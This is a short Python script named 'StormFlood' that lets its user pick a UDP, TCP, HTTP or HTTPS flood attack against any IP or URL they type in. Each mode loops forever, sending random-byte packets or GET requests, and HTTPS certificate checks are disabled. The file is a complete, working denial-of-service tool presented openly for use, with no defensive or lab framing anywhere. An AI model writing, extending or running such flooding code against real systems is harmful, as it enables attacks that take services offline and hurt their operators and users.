import socket
import random
import os
import threading
import requests

# Clear the console
os.system("clear" if os.name == "posix" else "cls")

banner = """
\033[1;31m   ____  _                              _____ _           _ 
  / ___|| |_ ___  _ __ ___   ___  _ __ | ___(_)_ __   __| |
  \___ \| __/ _ \| '_ ` _ \ / _ \| '_ \| |_  | | '_ \ / _` |
   ___) | || (_) | | | | | | (_) | | | |  _| | | | | | (_| |
  |____/ \__\___/|_| |_| |_|\___/|_| |_|_|   |_|_| |_|\__,_|
\033[1;34m                     Author: creesoYT
\033[1;32m                     Program: StormFlood
"""

print(banner)

print("[1]: UDP Flood Attack")
print("[2]: TCP Flood Attack")
print("[3]: HTTP Flood Attack")
print("[4]: HTTPS Flood Attack")
choice = input("1/2/3/4: ")
target_ip = input("Target IP / URL: ")
target_port = int(input("Target Port (for TCP/UDP only, HTTP/HTTPS ignore): "))
data_size = int(input("Data size to send (bytes, for TCP/UDP only): "))

def udp():
    bytes_data = random._urandom(data_size)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    counter = 0
    while True:
        sock.sendto(bytes_data, (target_ip, target_port))
        counter += 1
        print(f"Packet Sent: {counter}")

def tcp():
    bytes_data = random._urandom(data_size)
    counter = 0
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendall(bytes_data)
            counter += 1
            print(f"Packet Sent: {counter}")
            sock.close()
        except Exception as e:
            print(f"Error: {e}")

def http_flood():
    counter = 0
    while True:
        try:
            r = requests.get(target_ip)
            counter += 1
            print(f"HTTP Request Sent: {counter}, Status: {r.status_code}")
        except Exception as e:
            print(f"Error: {e}")

def https_flood():
    counter = 0
    while True:
        try:
            r = requests.get(target_ip, verify=False)  # SSL sertifika doğrulamasını kapatıyoruz
            counter += 1
            print(f"HTTPS Request Sent: {counter}, Status: {r.status_code}")
        except Exception as e:
            print(f"Error: {e}")

if choice == "1":
    udp()
elif choice == "2":
    tcp()
elif choice == "3":
    http_flood()
elif choice == "4":
    https_flood()

